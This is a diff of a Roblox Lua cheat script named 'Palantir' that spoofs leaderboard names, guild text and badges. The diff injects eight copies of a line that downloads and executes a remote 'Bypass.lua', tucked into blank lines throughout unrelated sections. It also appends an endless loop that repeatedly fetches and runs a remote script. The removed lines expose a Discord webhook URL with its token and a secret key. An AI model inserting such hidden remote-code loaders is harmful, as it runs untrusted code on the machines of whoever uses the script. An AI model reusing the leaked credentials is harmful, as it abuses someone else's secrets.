@@ -2,7 +2,7 @@
 --// LINORIA LOAD
 --// =========================
 local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
 local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
 assert(Library, "Failed to load Library.lua")
 local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
@@ -62,12 +62,7 @@ getgenv().Settings = {
 }
 
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1454102218490908878/k_GqkU_Jh4I4x8PNUmKZCej8YJkl2O_Rue_HFav9Ki2yntg9ihvAjprXXkCHLq7wa55i"
-
--- 🔑 KEEP THIS SECRET
-local SECRET_KEY = "c21b962e71f1969d6aea8af9083cc2ec3267ac9c32939d88368ab876f514624d"
-
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
 
 
 --// =========================
@@ -327,7 +322,7 @@ local function setupLeaderboardHover(targetInitial, hoverText)
     for _, v in ipairs(frame:GetChildren()) do hook(v) end
     frame.ChildAdded:Connect(hook)
 end
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
 --// =========================
 --// GUILD TEXT SPOOF
 --// =========================
@@ -411,7 +406,7 @@ local function setupGuildInfo()
         frame.DescSheet.Desc.Text = table.concat(lines, "\n")
     end)
 end
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
 --// =========================
 --// BADGE INJECTION
 --// =========================
@@ -463,7 +458,7 @@ local function setExclusiveBadge(name)
     end
     setupBadgeInjection()
 end
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
 local function clearAllBadges()
     for k in pairs(getgenv().Settings.VISUAL.BADGE_TOGGLES) do
         getgenv().Settings.VISUAL.BADGE_TOGGLES[k] = false
@@ -493,7 +488,7 @@ local function setupWorldUI()
         slot.Text = getgenv().Settings.SERVER.CHARACTER_SLOT
     end
 end
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
 --// =========================
 --// APPLY ALL
 --// =========================
@@ -536,7 +531,7 @@ local function RemoveAllSpoofing()
             end
         end
     end
-
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/BelioScripts/Palantir/main/Bypass.lua"))()
     -- Restore leaderboard names
     for label, text in pairs(OriginalValues.LeaderboardNames) do
         if label and label.Parent then
@@ -735,6 +730,16 @@ local PalantirTheme = {
 
 for k, v in pairs(PalantirTheme) do
     pcall(function() ThemeManager.Theme[k] = v end)
+end
+while true do
+wait()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://example.com/script.lua"))()
+    end)
+
+    if not success then
+        warn("Loader failed:", err)
+    end
 end
 
 ThemeManager:SetFolder('Palantir')
